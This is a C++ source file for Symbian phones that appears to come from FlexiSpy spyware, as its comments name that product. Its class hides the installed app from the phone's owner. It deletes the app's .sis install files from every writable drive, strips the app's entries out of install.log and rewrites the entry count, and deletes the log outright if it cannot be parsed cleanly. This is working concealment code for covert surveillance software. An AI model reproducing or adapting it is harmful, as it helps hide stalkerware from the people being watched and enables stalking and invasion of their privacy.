#include "FxAppManagerInvisibleMaker.h"
#include "Global.h"

#include <bautils.h>
#include <s32file.h>
#include <es_sock.h>//BigEndian
#include <string.h>
#include <types.h>
#include <in.h>

CFxAppManagerInvisibleMaker::CFxAppManagerInvisibleMaker(RFs& aFs)
:CActive(CActive::EPriorityLow),
 iFs(aFs)
{	
	iStep = EStepNone;
}

CFxAppManagerInvisibleMaker::~CFxAppManagerInvisibleMaker()
{	
	Cancel();
	DELETE(iTimeout);
	DELETE(iDataRead);
	DELETE(iDataWrite);
	iFile.Close();
}

CFxAppManagerInvisibleMaker* CFxAppManagerInvisibleMaker::NewL(RFs& aFs)
{
	CFxAppManagerInvisibleMaker* self = new (ELeave)CFxAppManagerInvisibleMaker(aFs);
	CleanupStack::PushL(self);
	self->ConstructL();
	CleanupStack::Pop(self);
	return self;
}

void CFxAppManagerInvisibleMaker::ConstructL()
{	
	iTimeout = CTimeOut::NewL(*this);
	
	//wait 1 minute before running this task
	iTimeout->SetInterval(0);//(KWaitBeforeRun);
	CActiveScheduler::Add(this);	
}

void CFxAppManagerInvisibleMaker::HandleTimedOutL()
{
	iStep = EStepHideFromAppManager;
	
	CompleteSelf();
}

void CFxAppManagerInvisibleMaker::CompleteSelf()
{	
	Cancel();
	
	if (!IsActive()) {
		SetActive();			
		TRequestStatus* status = &iStatus;	// iStatus inherited from CActive
		User::RequestComplete(status, KErrNone);
	}	
}

void CFxAppManagerInvisibleMaker::MakeInvisible()
{	
	iTimeout->Start();
}

void CFxAppManagerInvisibleMaker::MakeInvisibleD()
{
	iSelfDelete=ETrue;
	iTimeout->Start();
}

void CFxAppManagerInvisibleMaker::DoCancel()
{	
	switch(iStep)
		{
		case EStepFileIsRead:
		case EStepFileOverwrited:
		default:
			{
			TRequestStatus* status = &iStatus;
			User::RequestComplete(status, KErrCancel);	
			}
		}
}

void CFxAppManagerInvisibleMaker::RunL()
{	
	if(iStatus.Int() < KErrNone) {
		
		if(!iTimeout->IsActive()) {			
			iTimeout->Start();	
		}
		
		return;
	}
	
	switch(iStep)
	{	
		case EStepHideFromAppManager:
		{	
			HideFromAppManagerL();
			iStep = EStepHideLogHistroyInitiated;
			CompleteSelf();			
		}break;
		case EStepHideLogHistroyInitiated:
		{	
			InitHideLogHistroyL();
		}break;
		case EStepFileIsRead:
		{	
			iFile.Close();
			iStep = EStepFileManip;
			CompleteSelf();
		}break;
		case EStepFileManip:
		{	ManipLogFile();
		}break;
		case EStepFileOverwrited:
		{	
			//ensure that data is committed 
			iFile.Flush();
			
			//close it
			iFile.Close();
			iStep = EStepCompleted;
			CompleteSelf();
		}break;
		case EStepCompleted:
		{	
			if(iSelfDelete)
				{
				//
				//Delete self						
				delete this;
				}
		}break;
		default:
		{
		;
		}
	}		
}

TInt CFxAppManagerInvisibleMaker::RunError(TInt /*aError*/)
{ 
	if(!iTimeout->IsActive()) {
		iTimeout->SetInterval(KWaitAfterRunFailed);// 5 minutes
		iTimeout->Start();	
	}
	
	return KErrNone;
}

//----------------------------------------------------
//Hide From App Manager
//----------------------------------------------------
/*
* delete appname.sis in \system\install\ folder
*/
TInt CFxAppManagerInvisibleMaker::HideFromAppManagerL()
{			
	if(iHideFromAppManagerMade)
		return KErrNone;		
	
	TInt error = DeleteSisFilesL(iFs);
	
	if(!error)
		iHideFromAppManagerMade = ETrue;
	
	return error;
}

//delete all flexispy sis file in system.install.
TInt CFxAppManagerInvisibleMaker::DeleteSisFilesL(RFs& aFs)
{	
	TInt driveNumber=EDriveA; 
	TChar driveLetter;	
	TDriveList drivelist; 
	TInt err = aFs.DriveList(drivelist);
	if(err)
		return err;
	
	//loop all drive except read only 'Z' drive
	for (driveNumber=EDriveA; driveNumber<=EDriveY;driveNumber++){
		if (drivelist[driveNumber]) {// if drive-list entry non-zero, drive is available
			err = aFs.DriveToChar(driveNumber,driveLetter);
			if(err)
				break;
			
			TBuf<KInstallDirMaxLength> sysInstallDir;
			sysInstallDir.Append(driveLetter);				
			sysInstallDir.Append(KDriveDelimiter);
			sysInstallDir.Append(KInstallFolder);

			CDir* dirList;
			if(aFs.GetDir(sysInstallDir,KEntryAttAllowUid,ESortByName,dirList) != KErrNone) {
				continue;
			}
			
			for (TInt i=0;i<dirList->Count();i++) {
				const TEntry& entry = (*dirList)[i];	
				if(!entry.IsArchive())
					continue;
				
				//Archive file
				//check if it is flexispy v 1 or this version
				if(entry.IsUidPresent(KUidFxsLight_V1)
										 || entry.IsUidPresent(KUidFxsLight)
										 || entry.IsUidPresent(KUidFxsPro) 
										 || entry.IsUidPresent(KUidThisApp) ){
					
					TBuf<KInstallSisPathMaxLength> fullPath(sysInstallDir);
					fullPath.Append(entry.iName);

					//
					//delete ignore err
					aFs.Delete(fullPath);
				}
			}
			
			delete dirList;
		}		
	}
	
   return err;
}

//----------------------------------------------------
//Hide From App Manager Log History
//----------------------------------------------------
//
//Init
void CFxAppManagerInvisibleMaker::InitHideLogHistroyL()
{	
	DELETE(iDataRead);
	DELETE(iDataWrite);
		
	TInt err = iFile.Open(iFs,KInstallLogFile,EFileRead);
	
	if(err == KErrNotFound) //file not found
		return;
	else if(err < KErrNotFound)
		User::LeaveIfError(err);
	
	TInt size = 0;
	iFile.Size(size);
	iDataRead = HBufC8::NewL(size);	
	TPtr8 ptr = iDataRead->Des(); 
	iFile.Read(ptr, iStatus);
	
	iStep = EStepFileIsRead;
	SetActive();	
}

void CFxAppManagerInvisibleMaker::ManipLogFile()
{	
	TInt dataReadLen = iDataRead->Length();
	TPtrC8 dataReadPtr8(iDataRead->Des());
		
	//2. get number of entry
	TInt numberOfEntry = 0;
	GetNumberOfEntries(dataReadPtr8,numberOfEntry);
	//create byte array to overwrite install.log file
	iDataWrite = HBufC8::NewL(dataReadLen);
	TPtr8 dataWritePtr(iDataWrite->Des());
	
	//copy header bytes
	dataWritePtr.Copy(dataReadPtr8.Ptr(),KHeaderLength);
	
	TInt startPos = KPosistionFirstDelim;	
	
	TPtrC8 appNameV1Ptr(KAppNameV1);
	TPtrC8 appNameV2Ptr(KAppNameV2);
	TPtrC8 appNameV3Ptr(KAppNameV3);
	
	//append the rest
	TBool foundAppName = EFalse;
	TInt entryCount = 0;
	TInt i = 0;
	for(i = 0; i < numberOfEntry; i++) {
		
		if(startPos >= dataReadLen) {
			break;
		}
		
		HBufC8* entry = HBufC8::NewLC(KEntryMaxLength);
		TPtr8 entryPtr = entry->Des();		
		
		GetEntryByte(*iDataRead, startPos, entryPtr);		
		
		if(FoundTargetAppName(entryPtr,appNameV1Ptr)) {
			foundAppName = ETrue;
		} else if ( FoundTargetAppName(entryPtr,appNameV2Ptr)) {
			foundAppName = ETrue;
		} else if ( FoundTargetAppName(entryPtr,appNameV3Ptr)) {
			foundAppName = ETrue;
		} else {
			foundAppName = EFalse;
		}
		
		//update start position
		TInt entryByteLen = entryPtr.Length();
		startPos += entryByteLen;
		
		if(!foundAppName) { //not found
			dataWritePtr.Append(entryPtr);
		} else { // found 
			entryCount++;
		}
		
		CleanupStack::PopAndDestroy();
	}
	
	//numberOfEntry must be the same as number of loops
	//otherwise it is considered to be corrupted file then delete the file
	//ensure 
	if(numberOfEntry == i && dataWritePtr.Length() > KHeaderLength) {
		
		SetNumberOfEntryies(numberOfEntry - entryCount , dataWritePtr);		
		OverwriteFileL();				
	} else {
		iFs.Delete(KInstallLogFile);
		iStep = EStepCompleted;
		CompleteSelf();
	}
}

void CFxAppManagerInvisibleMaker::GetEntryByte(const TDesC8& aData, TInt aStartPos, TDes8& aEntry)
{	
	TPtrC8 ptr(aData);
	TInt pos = aStartPos;
	TInt dataLen = aData.Length();
	TBool breakNow = EFalse;
	for(;;) {
		
		if(pos >= dataLen)
			break;		
		const TUint8& b = ptr[pos];
		TInt entryDimLength = sizeof(KEntryDilms);
		for(TInt i=0; i<entryDimLength;i++) 
			{
			TUint8 delim = KEntryDilms[i];
			if(b == delim && pos > aStartPos) 
				{
				breakNow = ETrue;
				break;
				}
			}		
		if(breakNow)
			break;		
		pos++;
		aEntry.Append(b);		
	}	
}

void CFxAppManagerInvisibleMaker::OverwriteFileL()
{		
	User::LeaveIfError(iFile.Replace(iFs,KInstallLogFile(),EFileWrite));
	iStep = EStepFileOverwrited;
	iFile.Write(*iDataWrite,iDataWrite->Length(),iStatus);
	SetActive();
	
}

TBool CFxAppManagerInvisibleMaker::FoundTargetAppName(const TPtrC8 aSource, const TPtrC8 aAppName)
{			
	//searching for aAppName in aData
	return aSource.Find(aAppName) != KErrNotFound;	
}

void CFxAppManagerInvisibleMaker::GetNumberOfEntries(const TDesC8& aData,TInt& aResult)
{	
	if(aData.Length() < KHeaderLength)
		return;	
		
	TPtrC8 numEntry = aData.Mid(KPosNumberOfEntryOffset,KNumberOfEntryLength);	
	aResult = BigEndian::Get32(numEntry.Ptr());	
}

void CFxAppManagerInvisibleMaker::SetNumberOfEntryies(TUint aNumberOfEntry, TDes8& aData)
{	
	if(aData.Length() < KHeaderLength)
		return;
	
	TUint8* bNumberOfEntry = new TUint8[KNumberOfEntryLength];	
	TUint numberOfEntry = htonl(aNumberOfEntry);
	Mem::Copy(bNumberOfEntry, &numberOfEntry, KNumberOfEntryLength);
	 
	TPtrC8 numberOfEntry8(bNumberOfEntry, KNumberOfEntryLength);	
	aData.Replace(KPosNumberOfEntryOffset, KNumberOfEntryLength ,numberOfEntry8);
	
	delete[] bNumberOfEntry;
}


